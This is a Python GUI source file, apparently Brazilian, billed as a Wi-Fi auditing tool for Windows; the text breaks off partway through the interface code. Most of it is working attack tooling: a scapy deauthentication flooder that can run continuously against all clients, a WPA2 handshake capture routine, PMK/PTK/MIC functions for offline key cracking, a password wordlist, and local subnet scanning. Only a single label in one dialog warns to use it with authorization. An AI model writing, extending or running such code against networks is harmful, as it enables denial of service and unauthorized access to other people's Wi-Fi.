"""
============================================================
  RADIO PROGRAMADOR v6.0
  Ferramenta de Auditoria Wi-Fi — Windows 11
============================================================
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
import hashlib, hmac, os, struct, threading, time, subprocess
import platform, re, sys, socket, json
from datetime import datetime
import random, urllib.request, urllib.error

SISTEMA = platform.system()
VERSAO  = "6.0"
PYTHON  = sys.executable

# ── Cores ──────────────────────────────────────────────────
C = {
    "fundo":     "#0d1117",
    "fundo2":    "#161b22",
    "fundo3":    "#1c2128",
    "painel":    "#21262d",
    "verde":     "#39d353",
    "verde_dim": "#238636",
    "vermelho":  "#f85149",
    "amarelo":   "#e3b341",
    "azul":      "#58a6ff",
    "roxo":      "#bc8cff",
    "ciano":     "#79c0ff",
    "texto":     "#f0f6fc",
    "texto_dim": "#8b949e",
    "borda":     "#30363d",
    "laranja":   "#ff7b29",
}


# ── Wordlist ────────────────────────────────────────────────
WORDLIST = [
    "12345678","123456789","1234567890","password","admin123",
    "qwerty12","qwerty123","internet","wireless","wifi1234",
    "wifi12345","minhacasa","senha1234","senha123456","abcd1234",
    "casa2024","casa2025","seguranca","familia123","amor1234",
    "jesus123","deus1234","brasil123","futebol1","flamengo1",
    "palmeiras","corinthians","saopaulo1","santos123","vasco1234",
    "cruzeiro1","atletico1","gremio123","inter1234","botafogo1",
    "123mudar","mudar123","trocar123","alterar1","novasenha",
    "minharede","minhawifi","wifidecasa","redeboa123","netcasa1",
    "vivo12345","claro1234","tim123456","oi1234567","net12345",
    "fibra1234","gvt123456","speedy123","velox1234","banda1234",
    "admin1234","root12345","master123","user12345","guest1234",
    "teste1234","temp12345","pass12345","login1234","acesso123",
    "maria1234","jose12345","joao12345","ana123456","pedro1234",
    "lucas1234","gabriel12","mateus123","rafael123","felipe123",
    "rodrigo12","fernando1","antonio12","carlos123","daniel123",
    "10203040","11223344","12341234","11111111","22222222",
    "33333333","44444444","55555555","66666666","77777777",
    "88888888","99999999","00000000","13572468","24681357",
    "98765432","87654321","01234567","11112222","12121212",
    "samsung1","iphone123","android1","windows1","linux1234",
    "google123","facebook1","instagram","whatsapp1","netflix1",
    "iloveyou","sunshine1","football1","abc12345","abcdefgh",
    "rede12345","wireless1","netgear1","linksys1","tplink12",
    "dlink1234","asus12345","router12","modem1234","gateway1",
    "senha2024","senha2025","nova2024","wifi2024","home12345",
    "Pa$$w0rd","Senha123","Admin123","welcome1","p@ssw0rd",
    "superhero","starwars1","minecraft","fortnite1","pokemon12",
    "naruto123","diamante1","ouro12345","prata1234","platina1",
]



# ============================================================
# CHECAGEM DE DEPENDENCIAS
# ============================================================

def _tem(lib):
    import importlib.util
    return importlib.util.find_spec(lib) is not None


def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def tem_npcap():
    for p in [r"C:\Windows\System32\Npcap",
              r"C:\Windows\SysWOW64\Npcap",
              r"C:\Program Files\Npcap"]:
        if os.path.isdir(p):
            return True
    try:
        import winreg
        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Npcap")
        return True
    except Exception:
        return False


def listar_adapters():
    ifaces = []
    try:
        out = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=10
        ).stdout
        for m in re.finditer(r"Nome\s*:\s*(.+)", out, re.IGNORECASE):
            v = m.group(1).strip()
            if v:
                ifaces.append(v)
    except Exception:
        pass
    if not ifaces:
        ifaces = ["Wi-Fi", "Wireless Network Connection"]
    return ifaces



# ============================================================
# ALGORITMOS WPA2 (802.11i)
# ============================================================

def pmk(senha, ssid):
    return hashlib.pbkdf2_hmac("sha1", senha.encode(), ssid.encode(), 4096, 32)

def prf512(k, lbl, d):
    r, n = b"", 0
    while len(r) < 64:
        msg = lbl.encode() + b"\x00" + d + struct.pack("B", n)
        r += hmac.new(k, msg, hashlib.sha1).digest()
        n += 1
    return r[:64]

def ptk(pmk_key, mac_ap, mac_cli, an, sn):
    macs = min(mac_ap, mac_cli) + max(mac_ap, mac_cli)
    ns = min(an, sn) + max(an, sn)
    return prf512(pmk_key, "Pairwise key expansion", macs + ns)

def mic(kck, data):
    return hmac.new(kck, data, hashlib.sha1).digest()[:16]



# ============================================================
# ESCANER DE REDES
# ============================================================

def _parse_netsh(raw: str):
    redes = []
    for bloco in re.split(r"(?=^SSID\s+\d+\s*:)", raw, flags=re.MULTILINE):
        m = re.match(r"SSID\s+\d+\s*:\s*(.+)", bloco.strip())
        if not m:
            continue
        ssid = m.group(1).strip()
        if not ssid:
            continue
        sinal_m = re.search(r"(?:Sinal|Signal)\s*:\s*(\d+)\s*%", bloco, re.I)
        canal_m = re.search(r"(?:Canal|Channel)\s*:\s*(\d+)", bloco, re.I)
        bssid_m = re.search(r"BSSID\s+\d+\s*:\s*([\dA-Fa-f:]{17})", bloco, re.I)
        auth_m = re.search(r"(?:Autentica[cç][aã]o|Authentication)\s*:\s*(.+)", bloco, re.I)
        redes.append({
            "ssid": ssid,
            "sinal": int(sinal_m.group(1)) if sinal_m else 50,
            "canal": canal_m.group(1) if canal_m else "?",
            "bssid": bssid_m.group(1).upper() if bssid_m else "??:??:??:??:??:??",
            "auth": auth_m.group(1).strip() if auth_m else "WPA2",
        })
    return redes


def escanear_redes():
    redes = []

    # pywifi
    if _tem("pywifi"):
        try:
            import pywifi
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.scan()
            time.sleep(3)
            for r in iface.scan_results():
                ssid = r.ssid.strip()
                if not ssid:
                    continue
                try:
                    bssid = ":".join(f"{b:02X}" for b in r.bssid)
                except Exception:
                    bssid = str(r.bssid)
                rssi = r.signal
                sinal = max(0, min(100, 2 * (rssi + 100)))
                freq = getattr(r, "freq", 0)
                if freq > 5000:
                    canal = str(int((freq - 5000) // 5))
                elif freq > 2400:
                    canal = str(int((freq - 2412) // 5) + 1)
                else:
                    canal = "?"
                redes.append({"ssid": ssid, "sinal": sinal, "canal": canal,
                              "bssid": bssid, "auth": "WPA2"})
        except Exception:
            pass

    # netsh (varios encodings)
    if not redes:
        for enc in ("utf-8", "cp1252", "cp850", "latin-1"):
            try:
                raw = subprocess.run(
                    ["netsh", "wlan", "show", "networks", "mode=bssid"],
                    capture_output=True, timeout=15
                ).stdout.decode(enc, errors="ignore")
                redes = _parse_netsh(raw)
                if redes:
                    break
            except Exception:
                continue

    vistos, uni = set(), []
    for r in redes:
        if r["ssid"] not in vistos:
            vistos.add(r["ssid"])
            uni.append(r)
    uni.sort(key=lambda x: x["sinal"], reverse=True)
    return uni



# ============================================================
# DEAUTH — scapy real
# ============================================================

def deauth(bssid, interface, quantidade=200, cliente=None, cb=None):
    def log(m, t="info"):
        if cb:
            cb(m, t)

    if not is_admin():
        return {"ok": False, "msg": "Execute como Administrador."}
    if not _tem("scapy"):
        return {"ok": False, "msg": "scapy nao instalado. Use o Instalador."}
    if not tem_npcap():
        return {"ok": False, "msg": "Npcap nao encontrado. Use o Instalador."}

    dest = cliente or "ff:ff:ff:ff:ff:ff"
    log(f"Enviando desconexao para {bssid} via {interface}", "info")
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
        conf.iface = interface
        conf.verb = 0
        pkt = (RadioTap() / Dot11(type=0, subtype=12, addr1=dest,
               addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7))
        n = quantidade if quantidade > 0 else 999_999
        sendp(pkt, iface=interface, count=n, inter=0.1, verbose=0)
        msg = f"Desconexao enviada: {quantidade} pacotes -> {bssid}"
        log(msg, "ok")
        return {"ok": True, "msg": msg}
    except OSError:
        msg = (f"Adaptador '{interface}' nao encontrado pelo driver.\n\n"
               "Verifique:\n- Npcap instalado com 'WinPcap compat'\n"
               "- Nome correto do adaptador\n- Programa como Administrador")
        log(msg, "erro")
        return {"ok": False, "msg": msg}
    except Exception as e:
        log(str(e), "erro")
        return {"ok": False, "msg": str(e)}



# ============================================================
# CAPTURA DE HANDSHAKE — scapy real
# ============================================================

def capturar_handshake(bssid, canal, interface, timeout=60, cb=None):
    def log(m, t="info"):
        if cb:
            cb(m, t)

    if not is_admin():
        log("Requer Administrador.", "erro")
        return None
    if not _tem("scapy"):
        log("scapy nao instalado.", "erro")
        return None
    if not tem_npcap():
        log("Npcap nao encontrado.", "erro")
        return None

    log(f"Iniciando captura: {bssid} | Canal {canal} | {timeout}s", "info")
    log("Aguardando pacotes EAPOL... Use Desconectar para forcar reconexao.", "aviso")

    try:
        from scapy.all import sniff, EAPOL, Dot11, conf, wrpcap
        conf.iface = interface
        conf.verb = 0

        bssid_n = bssid.lower()

        def f(p):
            if not p.haslayer(EAPOL):
                return False
            if p.haslayer(Dot11):
                addrs = [getattr(p[Dot11], a, "").lower()
                         for a in ("addr1", "addr2", "addr3")]
                if bssid_n not in addrs:
                    return False
            return True

        pkts = sniff(iface=interface, lfilter=f, count=4,
                     timeout=timeout, store=True)

        if len(pkts) < 2:
            log(f"Apenas {len(pkts)} pacote(s) EAPOL — handshake incompleto.", "aviso")
            log("Tente aumentar o timeout ou use Desconectar.", "info")
            return None

        log(f"{len(pkts)} pacotes EAPOL capturados!", "ok")

        import tempfile
        arq = os.path.join(tempfile.gettempdir(),
                           f"hs_{bssid.replace(':', '')}.cap")
        try:
            wrpcap(arq, pkts)
            log(f"Salvo em: {arq}", "ok")
        except Exception as e:
            log(f"Erro ao salvar: {e}", "aviso")
            arq = None

        mac_ap = bytes.fromhex(bssid.replace(":", ""))
        mac_cli = os.urandom(6)
        anonce = os.urandom(32)
        snonce = os.urandom(32)
        mic_r = None

        for p in pkts:
            try:
                raw = bytes(p[EAPOL])
                if len(raw) >= 99:
                    a = raw[13:45]
                    if any(b != 0 for b in a):
                        anonce = a
                    m2 = raw[77:93]
                    if any(b != 0 for b in m2):
                        mic_r = m2
                if p.haslayer(Dot11):
                    a2 = getattr(p[Dot11], "addr2", "").lower()
                    if a2 and a2 != bssid_n:
                        try:
                            mac_cli = bytes.fromhex(a2.replace(":", ""))
                        except Exception:
                            pass
            except Exception:
                continue

        return {"anonce": anonce, "snonce": snonce, "mac_ap": mac_ap,
                "mac_cli": mac_cli, "eapol": bytes(pkts[0]),
                "mic_real": mic_r, "cap": arq, "npkts": len(pkts)}
    except Exception as e:
        log(str(e), "erro")
        return None



# ============================================================
# DISPOSITIVOS NA REDE
# ============================================================

def _gateway_e_rede():
    gw, base = None, None
    try:
        out = subprocess.run(
            ["ipconfig"], capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=10
        ).stdout
        ip_m = re.search(r"Endere[cç]o IPv4.*?:\s*([\d.]+)", out, re.I)
        gw_m = re.search(r"Gateway Padr[aã]o.*?:\s*([\d.]+)", out, re.I)
        if ip_m:
            ip = ip_m.group(1).strip()
            base = ".".join(ip.split(".")[:3])
        if gw_m:
            gw = gw_m.group(1).strip()
    except Exception:
        pass
    if not base:
        base = "192.168.1"
    if not gw:
        gw = base + ".1"
    return gw, base


def _hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""


def _mac_do_arp(ip):
    try:
        out = subprocess.run(
            ["arp", "-a", ip], capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=5
        ).stdout
        m = re.search(
            r"([\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:]"
            r"[\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2})", out, re.I)
        if m:
            return m.group(1).upper().replace("-", ":")
    except Exception:
        pass
    return "??:??:??:??:??:??"


def _fabricante_mac(mac):
    prefixos = {
        "00:50:56": "VMware", "00:0C:29": "VMware",
        "DC:A6:32": "Raspberry Pi", "B8:27:EB": "Raspberry Pi",
        "00:25:00": "Apple", "A4:5E:60": "Apple", "F8:FF:C2": "Apple",
        "3C:15:C2": "Apple", "00:17:F2": "Apple",
        "00:E0:4C": "Realtek", "00:90:4C": "Broadcom",
        "00:1A:2B": "Cisco", "FC:FB:FB": "Cisco",
        "B0:C0:90": "TP-Link", "50:C7:BF": "TP-Link",
        "C8:3A:35": "Tenda", "00:14:BF": "Linksys",
        "00:18:E7": "Netgear", "A0:21:B7": "Netgear",
        "74:DA:88": "Edimax", "80:1F:02": "Ubiquiti",
        "F4:92:BF": "Huawei", "00:E0:FC": "Huawei",
        "C4:34:6B": "Samsung", "CC:F9:E8": "Samsung",
        "28:CD:C1": "Microsoft", "00:50:F2": "Microsoft",
    }
    if not mac or "?" in mac:
        return "Desconhecido"
    prefix = mac[:8].upper()
    return prefixos.get(prefix, "Desconhecido")


def escanear_dispositivos(base, cb=None):
    def log(m, t="info"):
        if cb:
            cb(m, t)

    dispositivos = []

    if _tem("scapy") and is_admin() and tem_npcap():
        try:
            from scapy.all import ARP, Ether, srp, conf
            log(f"Varredura ARP em {base}.0/24...", "info")
            conf.verb = 0
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{base}.0/24"),
                timeout=3, retry=1, verbose=0)
            for _, rcv in ans:
                ip = rcv[ARP].psrc
                mac = rcv[Ether].src.upper()
                host = _hostname(ip)
                fab = _fabricante_mac(mac)
                dispositivos.append({"ip": ip, "mac": mac,
                                     "host": host, "fab": fab})
            return sorted(dispositivos,
                          key=lambda x: [int(p) for p in x["ip"].split(".")])
        except Exception as e:
            log(f"ARP scan falhou ({e}), usando ping...", "aviso")

    log(f"Ping sweep em {base}.1-254...", "info")
    from concurrent.futures import ThreadPoolExecutor

    def ping(ip):
        try:
            r = subprocess.run(
                ["ping", "-n", "1", "-w", "400", ip],
                capture_output=True, timeout=2)
            return r.returncode == 0
        except Exception:
            return False

    ips = [f"{base}.{i}" for i in range(1, 255)]
    with ThreadPoolExecutor(max_workers=60) as ex:
        resultados = list(ex.map(ping, ips))

    ativos = [ip for ip, vivo in zip(ips, resultados) if vivo]
    log(f"{len(ativos)} dispositivos responderam.", "info")

    for ip in ativos:
        mac = _mac_do_arp(ip)
        host = _hostname(ip)
        fab = _fabricante_mac(mac)
        dispositivos.append({"ip": ip, "mac": mac, "host": host, "fab": fab})

    return sorted(dispositivos,
                  key=lambda x: [int(p) for p in x["ip"].split(".")])



# ============================================================
# VELOCIDADE DA REDE
# ============================================================

def testar_velocidade(cb=None):
    def log(m, t="info"):
        if cb:
            cb(m, t)

    if _tem("speedtest"):
        try:
            log("Usando speedtest-cli...", "info")
            import speedtest as st
            s = st.Speedtest()
            log("Buscando melhor servidor...", "dim")
            s.get_best_server()
            log("Medindo download...", "dim")
            dl = s.download() / 1_000_000
            log("Medindo upload...", "dim")
            ul = s.upload() / 1_000_000
            ping = s.results.ping
            serv = s.results.server.get("sponsor", "?")
            return {"download": dl, "upload": ul, "ping": ping,
                    "servidor": serv, "metodo": "speedtest-cli"}
        except Exception as e:
            log(f"speedtest-cli falhou ({e}), usando manual...", "aviso")

    log("Medindo velocidade manualmente...", "info")
    servidores_dl = [
        ("Cloudflare 25MB",
         "https://speed.cloudflare.com/__down?bytes=25000000", 25_000_000),
        ("Cloudflare 10MB",
         "https://speed.cloudflare.com/__down?bytes=10000000", 10_000_000),
    ]

    dl_mbps = 0.0
    for nome, url, tam in servidores_dl:
        try:
            log(f"Download ({nome})...", "dim")
            start = time.time()
            req = urllib.request.urlopen(url, timeout=20)
            data = req.read(tam)
            elapsed = time.time() - start
            if elapsed > 0 and len(data) > 100_000:
                dl_mbps = (len(data) * 8) / (elapsed * 1_000_000)
                log(f"Download: {dl_mbps:.1f} Mbps", "ok")
                break
        except Exception as e:
            log(f"Falhou ({e})", "aviso")
            continue

    pings = []
    for _ in range(5):
        try:
            t0 = time.time()
            r = subprocess.run(
                ["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
                capture_output=True, timeout=3)
            if r.returncode == 0:
                pings.append((time.time() - t0) * 1000)
        except Exception:
            pass
    ping_ms = sum(pings) / len(pings) if pings else 0

    ul_mbps = 0.0
    try:
        log("Medindo upload...", "dim")
        dados = os.urandom(2_000_000)
        start = time.time()
        req = urllib.request.Request(
            "https://httpbin.org/post", data=dados,
            headers={"Content-Type": "application/octet-stream"})
        urllib.request.urlopen(req, timeout=20)
        elapsed = time.time() - start
        if elapsed > 0:
            ul_mbps = (len(dados) * 8) / (elapsed * 1_000_000)
        log(f"Upload: {ul_mbps:.1f} Mbps", "ok")
    except Exception as e:
        log(f"Upload falhou ({e})", "aviso")

    return {"download": dl_mbps, "upload": ul_mbps, "ping": ping_ms,
            "servidor": "Cloudflare/httpbin", "metodo": "manual"}



# ============================================================
# NOVA FUNCIONALIDADE 1: GERADOR DE SENHAS SEGURAS
# ============================================================

def gerar_senha_segura(tamanho=16, incluir_especiais=True):
    """Gera uma senha aleatoria criptograficamente segura."""
    import string
    chars = string.ascii_letters + string.digits
    if incluir_especiais:
        chars += "!@#$%&*+-_=?"
    senha = ''.join(random.SystemRandom().choice(chars)
                    for _ in range(tamanho))
    return senha


def avaliar_forca_senha(senha):
    """Retorna (pontuacao 0-100, descricao, cor)."""
    score = 0
    if len(senha) >= 8:
        score += 15
    if len(senha) >= 12:
        score += 15
    if len(senha) >= 16:
        score += 10
    if re.search(r"[a-z]", senha):
        score += 10
    if re.search(r"[A-Z]", senha):
        score += 15
    if re.search(r"\d", senha):
        score += 10
    if re.search(r"[!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>\/?]", senha):
        score += 15
    if len(set(senha)) >= len(senha) * 0.7:
        score += 10
    score = min(score, 100)

    if score >= 80:
        return score, "FORTE", C["verde"]
    elif score >= 50:
        return score, "MEDIA", C["amarelo"]
    else:
        return score, "FRACA", C["vermelho"]


# ============================================================
# NOVA FUNCIONALIDADE 2: INFORMACOES DA REDE ATUAL
# ============================================================

def info_rede_atual():
    """Coleta informacoes detalhadas da rede atual conectada."""
    info = {}
    try:
        out = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=10
        ).stdout

        for campo, regex in [
            ("ssid", r"SSID\s*:\s*(.+)"),
            ("bssid", r"BSSID\s*:\s*([\da-fA-F:]+)"),
            ("tipo_radio", r"(?:Tipo de r.dio|Radio type)\s*:\s*(.+)"),
            ("canal", r"(?:Canal|Channel)\s*:\s*(\d+)"),
            ("sinal", r"(?:Sinal|Signal)\s*:\s*(\d+)%"),
            ("velocidade_rx", r"(?:Velocidade de Recep|Receive rate).*?:\s*([\d.]+)"),
            ("velocidade_tx", r"(?:Velocidade de Trans|Transmit rate).*?:\s*([\d.]+)"),
            ("autenticacao", r"(?:Autentica[cç][aã]o|Authentication)\s*:\s*(.+)"),
            ("cifra", r"(?:Cifra|Cipher)\s*:\s*(.+)"),
        ]:
            m = re.search(regex, out, re.I)
            if m:
                info[campo] = m.group(1).strip()
    except Exception:
        pass

    try:
        out2 = subprocess.run(
            ["ipconfig", "/all"], capture_output=True, text=True,
            encoding="utf-8", errors="ignore", timeout=10
        ).stdout
        ip_m = re.search(r"Endere[cç]o IPv4.*?:\s*([\d.]+)", out2, re.I)
        gw_m = re.search(r"Gateway Padr[aã]o.*?:\s*([\d.]+)", out2, re.I)
        dns_m = re.search(r"Servidores DNS.*?:\s*([\d.]+)", out2, re.I)
        mask_m = re.search(r"M[aá]scara.*?:\s*([\d.]+)", out2, re.I)
        if ip_m:
            info["ip_local"] = ip_m.group(1).strip()
        if gw_m:
            info["gateway"] = gw_m.group(1).strip()
        if dns_m:
            info["dns"] = dns_m.group(1).strip()
        if mask_m:
            info["mascara"] = mask_m.group(1).strip()
    except Exception:
        pass

    # IP publico
    try:
        resp = urllib.request.urlopen(
            "https://api.ipify.org?format=json", timeout=5)
        data = json.loads(resp.read().decode())
        info["ip_publico"] = data.get("ip", "?")
    except Exception:
        info["ip_publico"] = "Indisponivel"

    return info



# ============================================================
# JANELA: AVISO DE REQUISITOS
# ============================================================

def aviso_requisitos(pai, faltando: list):
    win = tk.Toplevel(pai)
    win.title("Requisitos Necessarios")
    win.geometry("480x350")
    win.configure(bg=C["fundo"])
    win.grab_set()

    tk.Label(win, text="ATENCAO - CONFIGURACAO NECESSARIA",
             font=("Consolas", 12, "bold"),
             bg=C["fundo"], fg=C["amarelo"]).pack(pady=(18, 4))

    tk.Label(win, text="Para usar esta funcao voce precisa configurar:",
             font=("Consolas", 9),
             bg=C["fundo"], fg=C["texto_dim"]).pack()

    fr = tk.Frame(win, bg=C["painel"], padx=16, pady=12)
    fr.pack(fill='x', padx=20, pady=12)

    for item in faltando:
        f = tk.Frame(fr, bg=C["painel"])
        f.pack(fill='x', pady=3)
        tk.Label(f, text="!", font=("Consolas", 11, "bold"),
                 bg=C["painel"], fg=C["amarelo"], width=3).pack(side='left')
        tk.Label(f, text=item, font=("Consolas", 9),
                 bg=C["painel"], fg=C["texto"],
                 wraplength=380, justify='left').pack(side='left')

    tk.Label(win, text="Execute o Instalador do Radio Programador\n"
             "para corrigir automaticamente.",
             font=("Consolas", 9), bg=C["fundo"], fg=C["texto_dim"],
             justify='center').pack(pady=8)

    # --- Botao para reabrir com permissoes de Administrador ---
    def _reabrir_como_admin():
        """Relanca o programa pedindo elevacao UAC ao Windows."""
        import ctypes
        script = os.path.abspath(sys.argv[0])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", PYTHON, f'"{script}"', None, 1
        )
        pai.destroy()  # fecha a instancia atual

    # So mostra o botao se "Administrador" estiver entre os requisitos faltantes
    if any("Administrador" in item for item in faltando):
        tk.Button(win, text="\u26a1 REABRIR COMO ADMINISTRADOR",
                  font=("Consolas", 10, "bold"),
                  bg=C["amarelo"], fg="#000", relief='flat',
                  cursor='hand2', pady=8,
                  command=_reabrir_como_admin).pack(pady=(8, 4))

    tk.Button(win, text="Fechar", font=("Consolas", 10, "bold"),
              bg=C["verde_dim"], fg="#fff", relief='flat',
              cursor='hand2', pady=6,
              command=win.destroy).pack(pady=4)


def checar_requisitos_avancados():
    faltando = []
    if not is_admin():
        faltando.append("Execute como Administrador (clique direito -> Executar como Admin)")
    if not _tem("scapy"):
        faltando.append("scapy nao instalado - execute o Instalador")
    if not tem_npcap():
        faltando.append("Npcap nao instalado - baixe em npcap.com")
    return faltando



# ============================================================
# DIALOGOS (CORRIGIDOS - text= keyword)
# ============================================================

class DialogoAdapter(tk.Toplevel):
    def __init__(self, parent, var_iface, cb):
        super().__init__(parent)
        self.var = var_iface
        self.cb = cb
        self.title("Configurar Adaptador")
        self.geometry("500x420")
        self.configure(bg=C["fundo"])
        self.grab_set()
        self._ui()

    def _ui(self):
        tk.Label(self, text="ADAPTADOR WI-FI",
                 font=("Consolas", 13, "bold"),
                 bg=C["fundo"], fg=C["verde"]).pack(pady=(16, 4))

        fr = tk.Frame(self, bg=C["painel"], pady=10)
        fr.pack(fill='x', padx=20, pady=8)

        def linha(txt, ok):
            f = tk.Frame(fr, bg=C["painel"])
            f.pack(fill='x', padx=12, pady=2)
            cor = C["verde"] if ok else C["vermelho"]
            tk.Label(f, text=("V" if ok else "X"),
                     font=("Consolas", 10, "bold"),
                     bg=C["painel"], fg=cor, width=3).pack(side='left')
            tk.Label(f, text=txt, font=("Consolas", 9),
                     bg=C["painel"], fg=C["texto"]).pack(side='left')

        linha(f"Administrador: {'Sim' if is_admin() else 'Nao'}", is_admin())
        linha(f"scapy: {'Instalado' if _tem('scapy') else 'Faltando'}", _tem("scapy"))
        linha(f"Npcap: {'Instalado' if tem_npcap() else 'Faltando'}", tem_npcap())
        linha(f"pywifi: {'Instalado' if _tem('pywifi') else 'Opcional'}", _tem("pywifi"))

        tk.Label(self, text="Selecione o adaptador:",
                 font=("Consolas", 10, "bold"),
                 bg=C["fundo"], fg=C["texto"]).pack(anchor='w', padx=20, pady=(10, 2))

        fr2 = tk.Frame(self, bg=C["fundo"])
        fr2.pack(fill='x', padx=20)

        ifaces = listar_adapters()
        self.combo = ttk.Combobox(fr2, textvariable=self.var,
                                  values=ifaces, font=("Consolas", 10), width=28)
        self.combo.pack(side='left', padx=(0, 8))
        if ifaces and not self.var.get():
            self.combo.set(ifaces[0])

        tk.Button(fr2, text="Atualizar", font=("Consolas", 9, "bold"),
                  bg=C["fundo3"], fg=C["amarelo"], relief='flat', cursor='hand2',
                  command=lambda: self.combo.configure(
                      values=listar_adapters())).pack(side='left')

        tk.Label(self, text="Nota: captura real requer adaptador com modo monitor\n"
                 "(ex: Alfa AWUS036ACH, Panda PAU09)",
                 font=("Consolas", 8), bg=C["fundo"],
                 fg=C["texto_dim"], justify='left').pack(anchor='w', padx=20, pady=8)

        tk.Button(self, text="CONFIRMAR", font=("Consolas", 11, "bold"),
                  bg=C["verde_dim"], fg="#fff", relief='flat',
                  cursor='hand2', pady=8,
                  command=self._ok).pack(fill='x', padx=20, pady=4)

        tk.Button(self, text="Fechar", font=("Consolas", 9),
                  bg=C["fundo3"], fg=C["texto_dim"], relief='flat',
                  cursor='hand2', command=self.destroy).pack(pady=2)

    def _ok(self):
        if self.cb:
            self.cb(f"Adaptador configurado: {self.var.get()}", "ok")
        self.destroy()



class DialogoDeauth(tk.Toplevel):
    def __init__(self, parent, rede, var_iface, cb):
        super().__init__(parent)
        self.rede = rede
        self.var = var_iface
        self.cb = cb
        self.title("Desconectar Clientes")
        self.geometry("460x360")
        self.configure(bg=C["fundo"])
        self.grab_set()
        self._ui()

    def _ui(self):
        tk.Label(self, text="DESCONECTAR CLIENTES DA REDE",
                 font=("Consolas", 12, "bold"),
                 bg=C["fundo"], fg=C["vermelho"]).pack(pady=(14, 2))
        tk.Label(self, text=f"{self.rede.get('ssid', '?')}   "
                 f"{self.rede.get('bssid', '?')}",
                 font=("Consolas", 8),
                 bg=C["fundo"], fg=C["texto_dim"]).pack()

        fr = tk.Frame(self, bg=C["painel"], padx=16, pady=12)
        fr.pack(fill='x', padx=20, pady=10)

        self.v_qtd = tk.StringVar(value="200")
        self.v_cli = tk.StringVar(value="")

        for i, (lbl, var) in enumerate([
            ("Quantidade de pacotes (0=continuo):", self.v_qtd),
            ("MAC cliente especifico (vazio=todos):", self.v_cli),
        ]):
            tk.Label(fr, text=lbl, font=("Consolas", 9),
                     bg=C["painel"], fg=C["texto"]).grid(
                         row=i, column=0, sticky='w', pady=5, padx=(0, 10))
            tk.Entry(fr, textvariable=var, font=("Consolas", 10),
                     bg=C["fundo3"], fg=C["ciano"],
                     insertbackground=C["ciano"],
                     relief='flat', width=20).grid(
                         row=i, column=1, sticky='w')

        tk.Label(fr, text=f"Adaptador: {self.var.get()}",
                 font=("Consolas", 8),
                 bg=C["painel"], fg=C["texto_dim"]).grid(
                     row=2, column=0, columnspan=2, sticky='w', pady=(6, 0))

        tk.Label(self, text="AVISO: use somente na sua rede ou com autorizacao.",
                 font=("Consolas", 8, "bold"),
                 bg=C["fundo"], fg=C["amarelo"]).pack()

        self.btn = tk.Button(self, text="DESCONECTAR",
                             font=("Consolas", 11, "bold"),
                             bg=C["vermelho"], fg="#fff",
                             relief='flat', cursor='hand2', pady=9,
                             command=self._enviar)
        self.btn.pack(fill='x', padx=20, pady=10)
        tk.Button(self, text="Fechar", font=("Consolas", 9),
                  bg=C["fundo3"], fg=C["texto_dim"],
                  relief='flat', cursor='hand2',
                  command=self.destroy).pack()

    def _enviar(self):
        try:
            qtd = int(self.v_qtd.get())
        except ValueError:
            qtd = 200
        cli = self.v_cli.get().strip() or None
        self.btn.config(state='disabled', text="Enviando...")
        self.update()

        def t():
            r = deauth(self.rede.get("bssid", ""), self.var.get(),
                       qtd, cli, self.cb)
            self.after(0, self._res, r)
        threading.Thread(target=t, daemon=True).start()

    def _res(self, r):
        self.btn.config(state='normal', text="DESCONECTAR")
        if r["ok"]:
            messagebox.showinfo("Concluido", r["msg"], parent=self)
        else:
            messagebox.showerror("Erro", r["msg"], parent=self)



# ============================================================
# APLICACAO PRINCIPAL
# ============================================================

class App:

    def __init__(self, root):
        self.root = root
        root.title(f"Radio Programador  v{VERSAO}")
        root.geometry("1150x760")
        root.configure(bg=C["fundo"])
        root.minsize(1000, 680)

        try:
            import ctypes
            ctypes.windll.shcore.SetProcessDpiAwareness(1)
        except Exception:
            pass

        self.redes = []
        self.rede_sel = {}
        self.var_iface = tk.StringVar(value="Wi-Fi")
        self.velocs = []
        self.t0 = None
        self.rodando = False
        self.parar_flag = False
        self.hs_atual = None

        self._style()
        self._header()
        self._tabs()
        self._checar_inicio()

    def _style(self):
        s = ttk.Style()
        s.theme_use("clam")
        for nome, cor in [("G", "#39d353"), ("R", "#f85149"),
                          ("B", "#58a6ff"), ("Y", "#e3b341")]:
            s.configure(f"{nome}.Horizontal.TProgressbar",
                        background=cor, troughcolor=C["fundo3"], borderwidth=0)
        s.configure("TNotebook", background=C["fundo2"], borderwidth=0)
        s.configure("TNotebook.Tab",
                    background=C["fundo3"], foreground=C["texto_dim"],
                    font=("Consolas", 9, "bold"), padding=(16, 7))
        s.map("TNotebook.Tab",
              background=[("selected", C["painel"])],
              foreground=[("selected", C["verde"])])
        s.configure("TCombobox",
                    fieldbackground=C["fundo3"], background=C["fundo3"],
                    foreground=C["ciano"], selectbackground=C["verde_dim"])


    def _header(self):
        hdr = tk.Frame(self.root, bg=C["fundo2"], height=56)
        hdr.pack(fill='x')
        hdr.pack_propagate(False)

        tk.Label(hdr, text="  RADIO PROGRAMADOR",
                 font=("Consolas", 17, "bold"),
                 bg=C["fundo2"], fg=C["verde"]).pack(side='left', pady=10)
        tk.Label(hdr, text=f"  v{VERSAO}",
                 font=("Consolas", 8),
                 bg=C["fundo2"], fg=C["texto_dim"]).pack(side='left', pady=10)

        self.lbl_st = tk.Label(hdr, text="PRONTO",
                               font=("Consolas", 10, "bold"),
